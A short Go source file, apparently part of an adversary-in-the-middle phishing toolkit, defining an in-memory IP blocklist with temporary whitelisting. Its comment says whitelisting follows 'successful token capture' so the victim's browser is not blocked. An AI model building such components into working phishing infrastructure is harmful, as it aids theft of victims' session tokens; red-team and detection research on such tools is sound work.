package aitm

import (
	"sync"
	"time"
)

// BlacklistService manages IP-based access control using an in-memory set.
// Persistence will be layered on in a later phase.
type BlacklistService struct {
	bus       EventBus
	mu        sync.Mutex
	blocked   map[string]struct{}
	whitelist map[string]time.Time // IP → temporary exemption expiry
}

func NewBlacklistService(bus EventBus) *BlacklistService {
	return &BlacklistService{
		bus:       bus,
		blocked:   make(map[string]struct{}),
		whitelist: make(map[string]time.Time),
	}
}

// IsBlocked returns true if ip is on the blocklist and not temporarily whitelisted.
func (s *BlacklistService) IsBlocked(ip string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	if exp, ok := s.whitelist[ip]; ok && time.Now().Before(exp) {
		return false
	}
	_, blocked := s.blocked[ip]
	return blocked
}

// Block adds ip to the blocklist.
func (s *BlacklistService) Block(ip string) {
	s.mu.Lock()
	s.blocked[ip] = struct{}{}
	s.mu.Unlock()
}

// Unblock removes ip from the blocklist.
func (s *BlacklistService) Unblock(ip string) {
	s.mu.Lock()
	delete(s.blocked, ip)
	s.mu.Unlock()
}

// WhitelistTemporary exempts ip from blocking for dur. Used after successful
// token capture so the victim's real browser isn't blocked on the next request.
func (s *BlacklistService) WhitelistTemporary(ip string, dur time.Duration) {
	s.mu.Lock()
	s.whitelist[ip] = time.Now().Add(dur)
	s.mu.Unlock()
}
